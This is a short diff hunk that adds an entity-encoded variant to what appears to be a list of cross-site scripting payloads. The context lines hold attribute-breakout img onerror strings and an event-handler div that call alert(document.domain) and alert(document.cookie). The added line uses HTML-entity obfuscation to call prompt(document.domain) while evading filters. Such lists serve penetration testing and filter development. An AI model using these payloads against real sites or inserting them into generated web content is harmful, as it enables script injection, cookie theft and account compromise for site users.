@@ -10,4 +10,6 @@
 <div style="content-visibility:auto" oncontentvisibilityautostatechange="alert(document.domain)">x</div>
 
 ">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
+
+">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
 ```
